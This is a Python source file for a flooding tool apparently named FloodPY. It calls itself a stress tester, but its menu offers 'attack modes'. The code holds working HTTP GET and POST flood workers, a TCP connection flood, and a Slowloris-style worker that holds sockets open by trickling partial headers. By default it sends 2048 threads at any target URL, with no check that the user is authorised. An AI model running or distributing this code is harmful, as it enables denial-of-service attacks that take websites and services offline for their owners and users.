import concurrent.futures
import random
import threading
import httpx
import socket
from urllib.parse import urlparse
import sys
import os
import platform
import time
import colorama
import argparse

if platform.system() == "Windows":
    colorama.init()
    from colorama import Fore, Style
    GREEN, RED, YELLOW, CYAN, MAGENTA, RESET = Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA, Style.RESET_ALL
else:
    GREEN, RED, YELLOW, CYAN, MAGENTA, RESET = "\033[92m", "\033[91m", "\033[93m", "\033[96m", "\033[95m", "\033[0m"

stop_event = threading.Event()
requests_get_sent = 0
requests_post_sent = 0
connections_hit_made = 0
connections_held_made = 0
errors_count = 0
counter_lock = threading.Lock()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
]

def http_get_worker(url):
    global requests_get_sent, errors_count
    headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "*/*", "Connection": "keep-alive"}
    try:
        with httpx.Client(http2=True, verify=False, timeout=5) as client:
            while not stop_event.is_set():
                try:
                    client.get(f"{url}?{random.randint(1, 99999999)}", headers=headers)
                    with counter_lock:
                        requests_get_sent += 1
                except Exception:
                    with counter_lock:
                        errors_count += 1
    except Exception:
        with counter_lock:
            errors_count += 1

def http_post_worker(url):
    global requests_post_sent, errors_count
    headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "*/*", "Connection": "keep-alive"}
    try:
        with httpx.Client(http2=True, verify=False, timeout=5) as client:
            while not stop_event.is_set():
                try:
                    data = {f"data{i}": str(random.random()) for i in range(5)}
                    client.post(url, headers=headers, json=data)
                    with counter_lock:
                        requests_post_sent += 1
                except Exception:
                    with counter_lock:
                        errors_count += 1
    except Exception:
        with counter_lock:
            errors_count += 1

def tcp_hit_worker(host, port):
    global connections_hit_made, errors_count
    while not stop_event.is_set():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect((host, port))
                with counter_lock:
                    connections_hit_made += 1
        except Exception:
            with counter_lock:
                errors_count += 1

def tcp_hold_worker(host, port):
    global connections_held_made, errors_count
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, port))
        with counter_lock:
            connections_held_made += 1
        s.sendall(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
        while not stop_event.is_set():
            try:
                s.sendall(f"X-a: {random.randint(1,9999)}\r\n".encode())
                time.sleep(10)
            except socket.error:
                break
    except Exception:
        with counter_lock:
            errors_count += 1
    finally:
        with counter_lock:
            if connections_held_made > 0:
                connections_held_made -= 1

def display_stats(num_threads, mode, start_time):
    while not stop_event.is_set():
        elapsed_time = time.monotonic() - start_time
        if elapsed_time < 1:
            time.sleep(1)
            continue

        rps_get = int(requests_get_sent / elapsed_time)
        rps_post = int(requests_post_sent / elapsed_time)
        cps_hit = int(connections_hit_made / elapsed_time)

        status_line = f"\r{MAGENTA}Threads:{RESET} {num_threads:<7} | {RED}Errors:{RESET} {errors_count:<7}"
        
        if mode == 1:
            status_line += f" | {GREEN}GET/s:{RESET} {rps_get:<7}"
        elif mode == 2:
            status_line += f" | {CYAN}POST/s:{RESET} {rps_post:<7}"
        elif mode == 3:
            status_line += f" | {YELLOW}TCP Hit/s:{RESET} {cps_hit:<7} | {YELLOW}Held:{RESET} {connections_held_made:<5}"
        elif mode == 4:
            total_rps = rps_get + rps_post
            status_line += f" | {GREEN}RPS:{RESET} {total_rps:<7} | {YELLOW}TCP Hit/s:{RESET} {cps_hit:<7} | {YELLOW}Held:{RESET} {connections_held_made:<5}"
        
        sys.stdout.write(status_line.ljust(100))
        sys.stdout.flush()
        time.sleep(1)

def main():
    parser = argparse.ArgumentParser(description="Stress Testing Tool.")
    parser.add_argument("-u", "--url", help="Target URL")
    parser.add_argument("-t", "--threads", type=int, help="Number of threads per attack type")
    parser.add_argument("-m", "--mode", type=int, help="Attack mode (1-4)")
    args = parser.parse_args()

    os.system('cls' if os.name == 'nt' else 'clear')
    banner = fr"""{CYAN}
___________.__                    .__________________.___.
\_   _____/|  |   ____   ____   __| _/\______   \__  |   |
 |    __)  |  |  /  _ \ /  _ \ / __ |  |     ___//   |   |
 |     \   |  |_(  <_> |  <_> ) /_/ |  |    |    \____   |
 \___  /   |____/\____/ \____/\____ |  |____|    / ______|
     \/                            \/            \/
{RESET}{MAGENTA}                          Made by Kyra{RESET}"""
    print(banner)

    if args.url and args.threads and args.mode:
        url, num_threads, mode = args.url, args.threads, args.mode
        print(f"{CYAN}CLI mode: Target={YELLOW}{url}{CYAN} Threads={YELLOW}{num_threads}{CYAN} Mode={YELLOW}{mode}{CYAN}.{RESET}")
    else:
        DEFAULT_THREADS = 2048
        num_threads = int(input(f"{CYAN}Enter number of threads (Default: {DEFAULT_THREADS}) > {RESET}") or DEFAULT_THREADS)
        url = input(f"{CYAN}Enter target URL (e.g., https://example.com) > {RESET}")
        print(f"""{CYAN}
Select Flood Mode:
{YELLOW}1.{RESET} HTTP GET Flood
{YELLOW}2.{RESET} HTTP POST Flood
{YELLOW}3.{RESET} TCP Connection Flood
{YELLOW}4.{RESET} All Attacks Combined
""")
        mode = int(input(f"{CYAN}> {RESET}"))
    
    parsed_url = urlparse(url)
    host, port = parsed_url.hostname, parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
    
    total_threads = num_threads * 4 if mode == 4 else num_threads
    
    if total_threads > 15000:
        print(f"{YELLOW}[!] WARNING: Launching {total_threads} threads is extremely memory intensive and may fail.{RESET}")

    print(f"\n{MAGENTA}[*] Launching flood on {YELLOW}{url}{MAGENTA} with {CYAN}{total_threads}{MAGENTA} total threads...{RESET}")
    print(f"{RED}[!] This is an aggressive test. Press Ctrl+C to stop.{RESET}")
    time.sleep(2)

    start_time = time.monotonic()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=total_threads + 1) as executor:
        executor.submit(display_stats, total_threads, mode, start_time)
        
        if mode == 1:
            for _ in range(num_threads): executor.submit(http_get_worker, url)
        elif mode == 2:
            for _ in range(num_threads): executor.submit(http_post_worker, url)
        elif mode == 3:
            for i in range(num_threads):
                if i % 2 == 0: executor.submit(tcp_hit_worker, host, port)
                else: executor.submit(tcp_hold_worker, host, port)
        elif mode == 4:
            for _ in range(num_threads):
                executor.submit(http_get_worker, url)
                executor.submit(http_post_worker, url)
                executor.submit(tcp_hit_worker, host, port)
                executor.submit(tcp_hold_worker, host, port)

        try:
            while not stop_event.is_set():
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n{YELLOW}[!] Ctrl+C detected. Shutting down threads...{RESET}")
        finally:
            stop_event.set()
            executor.shutdown(wait=False, cancel_futures=True)

if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        print(f"{MAGENTA}[*] Flood script terminated.{RESET}")